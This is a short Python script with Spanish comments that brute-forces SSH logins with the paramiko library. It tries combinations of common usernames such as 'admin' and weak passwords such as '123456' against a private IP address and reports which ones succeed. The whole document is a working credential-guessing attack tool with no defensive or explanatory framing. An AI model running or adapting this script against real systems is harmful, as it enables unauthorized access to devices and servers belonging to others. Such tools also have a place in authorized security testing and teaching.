import paramiko
import itertools

# Función para intentar iniciar sesión SSH con un par de usuario/contraseña
def try_ssh_login(ip, username, password):
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
        client.connect(ip, username=username, password=password, timeout=3)
        print(f"[+] ¡Acceso exitoso con {username}:{password}!")
        client.close()
        return True
    except paramiko.AuthenticationException:
        print(f"[-] Falló el acceso con {username}:{password}")
        return False
    except Exception as e:
        print(f"Error al intentar conectarse a {ip}: {e}")
        return False

# Generador de combinaciones de usuario/contraseña
def generate_credentials(usernames, passwords):
    for username in usernames:
        for password in passwords:
            yield username, password

if __name__ == "__main__":
    # Configuración del objetivo y las credenciales a probar
    target_ip = "192.168.1.1"
    usernames = ["admin", "user"]
    passwords = ["password", "123456", "admin"]

    # Probar cada combinación de usuario/contraseña
    for username, password in generate_credentials(usernames, passwords):
        if try_ssh_login(target_ip, username, password):
            break
